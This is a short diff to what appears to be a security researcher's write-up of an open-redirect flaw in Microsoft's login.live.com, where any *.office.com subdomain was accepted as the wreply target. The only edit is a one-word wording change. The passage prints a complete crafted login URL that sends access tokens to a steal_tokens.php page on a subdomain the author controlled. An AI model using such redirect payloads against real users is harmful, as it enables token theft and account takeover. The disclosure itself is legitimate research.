@@ -23,7 +23,7 @@ the dangers of not using an exact URL match (or not properly validating) for wre
 was allowing any subdomains of office.com (*.office.com) to be a valid wreply URI. 
 
 
-Since one of their subdomain was in my control, I could use this domain as a valid `wreply` url and was able to leak the access tokens:
+Since one of their subdomain was in my control, I could use the domain as a valid `wreply` url and was able to leak the access tokens:
 
 `https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1529775349&rver=6.7.6643.0&wp=MBI_SSL&wreply=https://success.office.com/steal_tokens.php&lc=1033&id=292666&lw=1&fl=easi2&pcexp=true&uictx=me`
 
